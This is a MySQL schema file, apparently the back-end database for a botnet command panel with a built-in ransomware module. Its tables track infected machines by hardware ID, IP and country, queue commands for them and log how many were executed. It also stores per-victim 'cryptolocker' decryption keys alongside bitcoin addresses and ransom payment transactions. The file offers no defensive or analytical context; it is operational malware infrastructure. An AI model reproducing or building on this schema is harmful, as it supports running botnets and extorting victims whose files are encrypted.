CREATE TABLE IF NOT EXISTS `users` (
`id` int(5) NOT NULL auto_increment,
`user` varchar(65) NOT NULL default "",
`pwd` varchar(65) NOT NULL default "",
`role` int(1) NOT NULL default 0,
PRIMARY KEY (`id`)
);

CREATE TABLE IF NOT EXISTS `settings` (
`id` int(5) NOT NULL auto_increment,
`name` varchar(65) NOT NULL default "",
`value` varchar(65) NOT NULL default "",
PRIMARY KEY (`id`)
);

CREATE TABLE IF NOT EXISTS `sessions` (
`id` int(5) NOT NULL auto_increment,
`uid` int(5) NOT NULL default -1,
`created` TIMESTAMP default CURRENT_TIMESTAMP,
PRIMARY KEY (`id`)
);

CREATE TABLE IF NOT EXISTS `bots` (
`id` int(5) NOT NULL auto_increment,
`hwid` varchar(65) NOT NULL default "",
`OS` varchar(65) NOT NULL default "",
`IP` varchar(65) NOT NULL default "",
`country` varchar(65) NOT NULL default "",
`uid` int(5) NOT NULL default -1,
`date` TIMESTAMP default CURRENT_TIMESTAMP,
UNIQUE(`hwid`),
PRIMARY KEY (`id`)
);

CREATE TABLE IF NOT EXISTS `tasks` (
`id` int(11) NOT NULL AUTO_INCREMENT,
`countries` TEXT,
`command` varchar(255) NOT NULL,
`start` TIMESTAMP NOT NULL default 0,
`stop` TIMESTAMP NOT NULL default 0,
`count` int(10) NOT NULL default 0,
`received` int(10) NOT NULL default 0,
`executed` int(10) NOT NULL default 0,
`failed` int(10) NOT NULL default 0,
`uid` int(5) NOT NULL default -1,
PRIMARY KEY (`id`)
);

CREATE TABLE IF NOT EXISTS `setTasks` (
`id` int(5) NOT NULL auto_increment,
`tid` int(5) NOT NULL default -1,
`hwid` varchar(128) NOT NULL default "",
PRIMARY KEY (`id`)
);

CREATE TABLE IF NOT EXISTS `error` (
`id` int(5) NOT NULL auto_increment,
`os` varchar(65) NOT NULL default "",
`err` varchar(128) NOT NULL default "",
`date` TIMESTAMP default CURRENT_TIMESTAMP,
PRIMARY KEY (`id`)
);

CREATE TABLE IF NOT EXISTS `cryptolocker_keys` (
`id` int(5) NOT NULL auto_increment,
`hwid` varchar(65) NOT NULL default "",
`key` varchar(65) NOT NULL default "",
`btc` varchar(65) NOT NULL default "",
PRIMARY KEY (`id`)
);

CREATE TABLE IF NOT EXISTS `cryptolocker_transactions` (
`id` int(5) NOT NULL auto_increment,
`amount` decimal NOT NULL default 0,
`transaction_hash` varchar(65) NOT NULL default "",
`input_transaction_hash` varchar(65) NOT NULL default "",
`input_address` varchar(65) NOT NULL default "",
`secret` varchar(65) NOT NULL default "",
`recieved` TIMESTAMP default CURRENT_TIMESTAMP,
PRIMARY KEY (`id`)
);